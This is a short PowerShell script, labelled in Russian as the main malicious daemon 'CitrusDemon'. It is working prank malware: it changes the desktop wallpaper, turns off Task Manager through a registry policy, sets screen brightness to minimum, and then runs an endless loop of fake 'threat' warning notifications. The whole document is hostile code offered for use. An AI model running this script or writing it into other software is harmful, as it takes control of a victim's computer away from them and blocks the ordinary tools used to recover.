# CitrusDemon.ps1 - основной вредоносный демон

# Обои
$wp = "C:\ProgramData\Kostyan\kostyan_wallpaper.jpg"
if (Test-Path $wp) {
    Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class W{[DllImport("user32.dll")]public static extern int SystemParametersInfo(int u,int p,string v,int w);}'
    [W]::SystemParametersInfo(20,0,$wp,3)
}

# Отключение диспетчера задач
ni "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
sp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" "DisableTaskMgr" 1 -Type DWord -Force

# Минимальная яркость
(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,0)

# Бесконечные уведомления
while ($true) {
    $p = 'explorer','chrome','firefox','notepad','Taskmgr','powershell' | Get-Random
    Add-Type -AssemblyName System.Windows.Forms
    $n = New-Object System.Windows.Forms.NotifyIcon
    $n.Icon = [System.Drawing.SystemIcons]::Warning
    $n.BalloonTipTitle = "Цитрус Менгеле 🍋"
    $n.BalloonTipText = "Процесс $p — угроза! Убить нельзя 😈"
    $n.Visible = $true
    $n.ShowBalloonTip(5000)
    Start-Sleep -Seconds (Get-Random -Min 4 -Max 9)
    $n.Dispose()
}